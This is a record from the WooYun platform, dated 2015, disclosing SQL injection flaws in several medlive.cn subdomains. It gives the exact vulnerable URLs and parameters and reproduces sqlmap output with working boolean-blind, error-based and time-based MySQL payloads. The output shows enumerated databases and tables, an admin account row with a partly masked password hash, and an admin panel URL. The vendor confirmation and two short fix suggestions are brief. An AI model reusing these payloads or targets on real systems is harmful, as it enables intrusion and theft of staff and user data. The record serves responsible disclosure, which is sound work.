{"id": 32661, "wybug_id": "wooyun-2015-0110630", "wybug_title": "医脉通多处分站SQL注入漏洞#部分员工信息泄漏", "wybug_corp": "medlive.cn", "wybug_author": "Taro", "wybug_date": "2015-04-28 11:10", "wybug_open_date": "2015-06-12 17:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向公众公开  简要描述： rt... 详细说明：  1.新编全医药学大词典http://dic.medlive.cn/common/ajax.inc.php domain_id=1&ip_id=104462 两个参数都可以注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: domain_id    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: domain_id=1 RLIKE (SELECT (CASE WHEN (7715=7715) THEN 1 ELSE 0x28 END))&ip_id=104462    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: domain_id=1 AND (SELECT 1852 FROM(SELECT COUNT(*),CONCAT(0x7166706271,(SELECT (CASE WHEN (1852=1852) THEN 1 ELSE 0 END)),0x7161756c71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&ip_id=104462    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: domain_id=1 AND 7530=BENCHMARK(5000000,MD5(0x6a716a43))&ip_id=104462Place: POSTParameter: ip_id    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: domain_id=1&ip_id=104462 RLIKE (SELECT (CASE WHEN (9710=9710) THEN 104462 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: domain_id=1&ip_id=104462 AND (SELECT 5419 FROM(SELECT COUNT(*),CONCAT(0x7166706271,(SELECT (CASE WHEN (5419=5419) THEN 1 ELSE 0 END)),0x7161756c71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: domain_id=1&ip_id=104462 AND SLEEP(5)---there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: ip_id, type: Unescaped numeric (default)[1] place: POST, parameter: domain_id, type: Unescaped numeric[q] Quit>[12:28:35] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.2.14back-end DBMS: MySQL 5.0available databases [2]:[*] dic[*] information_schema\n\nDatabase: dic[7 tables]+----------------+| domain         || admin          || applyuser      || member_info    || presentee_list || recommend_list || scan_list      |+----------------+Database: dicTable: admin[1 entry]+--------+---------+----------+----------+----------------------------------+| userid | groupid | username | truename | password                         |+--------+---------+----------+----------+----------------------------------+| 1      | 1       | admin    | 超级管理员    | a2fb8873380f7a28e672d0************ |+--------+---------+----------+----------+----------------------------------+\n网站后台http://dic.medlive.cn/kyadmin.php员工信息泄漏，共计839条\n\n2.hight动生活DIY大赛http://diy.medlive.cn/?action=diy_search&file=diy\n\n3.中国心例程http://co-diovan.medlive.cn/?m=case&c=option&action=detail&id=278\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: m=case&c=option&action=detail&id=278 AND 7653=7653    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: m=case&c=option&action=detail&id=278 AND SLEEP(5)---[12:57:20] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.3web application technology: Apache 2.2.15back-end DBMS: MySQL 5.0.11[12:57:20] [INFO] fetching database names[12:57:20] [INFO] fetching number of databases[12:57:20] [INFO] resumed: 2[12:57:20] [INFO] resumed: information_schema[12:57:20] [INFO] resumed: fudaiwen_appavailable databases [2]:[*] fudaiwen_app[*] information_schema\n   漏洞证明：     修复方案：  1.参数过滤啊2.后台目录限制访问   版权声明：转载请注明来源 Taro@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-04-28 17:05 厂商回复： 非常感谢!! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}